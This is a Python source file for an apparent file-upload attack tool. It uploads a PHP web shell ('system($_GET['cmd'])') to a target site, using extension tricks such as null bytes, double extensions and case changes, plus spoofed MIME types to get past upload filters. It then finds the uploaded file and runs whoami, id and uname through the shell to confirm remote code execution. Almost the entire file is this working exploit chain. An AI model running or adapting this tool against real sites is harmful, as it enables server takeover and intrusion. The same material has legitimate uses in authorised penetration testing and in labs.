import requests
import requests
import logging
import re
import random
import string
from concurrent.futures import ThreadPoolExecutor
from core.mutator import PayloadMutator


class FileUploader:
    def __init__(self, session, upload_url, file_field, base_url, threads=5, proxy=None):
        self.session = session
        self.upload_url = upload_url
        self.file_field = file_field
        self.base_url = base_url.rstrip("/")
        self.threads = threads

        
        self.proxies = {
            "http": proxy,
            "https": proxy
        } if proxy else None

        
        self.verify = False if proxy else True

        
        self.results = []

    
    def add_result(self, url, severity, description):
        self.results.append({
            "url": url,
            "severity": severity,
            "description": description
        })

    
    def upload_file(self, filename, content, mime_type="application/octet-stream"):
        files = {
            self.file_field: (filename, content, mime_type)
        }

        try:
            response = self.session.post(
                self.upload_url,
                files=files,
                timeout=10,
                allow_redirects=True,
                proxies=self.proxies,
                verify=self.verify
            )

            logging.debug(f"[UPLOAD] {filename} -> {response.status_code}")

           
            paths = self.extract_file_paths(response.text)

            
            urls = self.build_urls(paths)

            
            self.check_uploaded_files(urls)

        except Exception as e:
            logging.error(f"Upload failed for {filename}: {e}")

    # =========================
    # PATH EXTRACTION
    # =========================
    def extract_file_paths(self, text):
        patterns = [
            r"uploads/[a-zA-Z0-9_.%-]+",
            r"hackable/uploads/[a-zA-Z0-9_.%-]+",
            r"images/[a-zA-Z0-9_.%-]+",
            r"files/[a-zA-Z0-9_.%-]+"
        ]

        found = []
        for pattern in patterns:
            matches = re.findall(pattern, text)
            found.extend(matches)

        return list(set(found))

    
    def build_urls(self, paths):
        return [f"{self.base_url}/{p}" for p in paths]

    
    def check_uploaded_files(self, urls):
        for url in urls:
            try:
                response = self.session.get(
                    url,
                    timeout=5,
                    proxies=self.proxies,
                    verify=self.verify
                )

                if response.status_code == 200:
                    print(f"[🔥 FOUND FILE] {url}")
                    self.add_result(url, "MEDIUM", "File uploaded and accessible")

                    
                    if self.verify_exploit(url):
                        print(f"[💀 FULL RCE CONFIRMED] {url}")

            except Exception:
                continue

    
    def verify_exploit(self, url):
        commands = [
            "whoami",
            "id",
            "uname -a"
        ]

        for cmd in commands:
            try:
                exploit_url = f"{url}?cmd={cmd}"

                response = self.session.get(
                    exploit_url,
                    timeout=5,
                    proxies=self.proxies,
                    verify=self.verify
                )

                if response.status_code == 200 and len(response.text.strip()) > 0:
                    print(f"[💀 RCE EXECUTED] {exploit_url}")
                    print(f"[OUTPUT] {response.text[:100]}")

                    self.add_result(
                        exploit_url,
                        "CRITICAL",
                        f"Command execution successful: {cmd}"
                    )

                    return True

            except Exception:
                continue

        return False

    
    def run(self):
        payload = "<?php system($_GET['cmd']); ?>"

        files = [
            "test.php",
            "test.php.jpg",
            "test.php;.jpg",
            "test.pHp",
            "test.php%00.jpg"
        ]

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for filename in files:
                executor.submit(self.upload_file, filename, payload)

    
    def mime_bypass_tests(self):
        payload = "<?php system($_GET['cmd']); ?>"

        tests = [
            ("shell.php", "image/jpeg"),
            ("shell.php", "image/png"),
            ("shell.php", "application/octet-stream"),
            ("shell.jpg", "application/x-php"),
            ("shell.php.jpg", "image/jpeg"),
        ]

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for filename, mime in tests:
                executor.submit(self.upload_file, filename, payload, mime)

    
    def ai_fuzzing(self):
        print("\n[🤯] AI Payload Mutation Started...")

        mutator = PayloadMutator()
        payloads = mutator.generate_all()

        payload = "<?php system($_GET['cmd']); ?>"

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for p in payloads:
                print(f"[AI-FUZZ] {p}")
                executor.submit(self.upload_file, p, payload)

    
    def run_all(self):
        self.run()
        self.mime_bypass_tests()
        self.ai_fuzzing()

        print("\n====== SUMMARY ======")
        for result in self.results:
            print(f"[{result['severity']}] {result['url']} -> {result['description']}")
